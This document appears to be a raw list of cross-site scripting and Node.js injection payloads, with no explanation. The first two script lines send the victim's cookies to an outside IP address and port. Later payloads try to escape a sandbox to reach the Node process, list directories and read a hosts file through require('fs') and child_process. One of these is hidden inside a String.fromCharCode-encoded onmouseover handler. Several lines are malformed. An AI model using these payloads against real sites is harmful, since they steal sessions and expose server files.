<script>document.location='http://62.173.140.174:16013/?'+document.cookie</script>
<script>new  Image().src="http://62.173.140.174:16013/?publication="+document.cookie;</script>

<script>
function gg(){alert(" Please view this is Firefox");}
gg();
const subProcess = require('child_process');
alert(document.cookie)
</script>

<script>alert(document.domain);
const process =
    (delete this.constructor.constructor,
    delete this.constructor,
    this.constructor.constructor('return process')());
const require = process.mainModule.require;
const fs = require('fs');
alert(fs.readdirSync('.'));
</script>



<script>
const { spawn } = require("child_process");

const ls = spawn("ls", ["-la"]);

ls.stdout.on("data", data => {
    console.log(`stdout: ${data}`);
});

ls.stderr.on("data", data => {
    console.log(`stderr: ${data}`);
});

ls.on('error', (error) => {
    console.log(`error: ${error.message}`);
});

ls.on("close", code => {
    console.log(`child process exited with code ${code}`);
});
</script>



<script>

const a = '10';
alert(a);
alert(document.domain);
alert(window.origin);
alert(document.cookie);
console.log("XSSTEST"+window.origin);
</script>


<a onmouseover="alert(1)"\>Click me!</a>
<a onmouseover="eval(String.fromCharCode(97 ,108 ,101 ,114 ,116 ,40 ,50 ,43 ,50 ,41))"\>Click me!</a>
<a onmouseover="eval(String.fromCharCode(114 ,101 ,113 ,117 ,105 ,114 ,101 ,40 ,39 ,102 ,115 ,39 ,41 ,46 ,114 ,101 ,97 ,100 ,100 ,105 ,114 ,83 ,121 ,110 ,99 ,40 ,39 ,46 ,39 ,41 ,46 ,116 ,111 ,83 ,116 ,114 ,105 ,110 ,103 ,40 ,41))"\>Click me!</a>

<a onmouseover="alert(eval("console.log('hello world')"))"\>Click me!</a>
<a onmouseover="alert(eval("3*4"))"\>Click me!</a>
<a onmouseover="alert(eval('1+1*5'))"\>Click me!</a>
require('fs').readdirSync('.').toString()
<a onmouseover="eval(alert(require('fs').readFileSync('hosts').toString()")"\>Click me!</a>


document.getElementById("resultFrame").contentWindow.Reset();

<div onmouseover="const { spawn } = require("child_process");
const ls = spawn("ls", ["-la"]);
alert(ls)"\>Click
</div>

<iframe id="result" sandbox="allow-scripts allow-modals"></iframe>
<script>
function unsafe(t) {
	var i = document.getElementById('result').contentWindow.Reset();
    	i.srcdoc = "<body><script>document.write("+t+");<"+"/script></body>;
}
</script>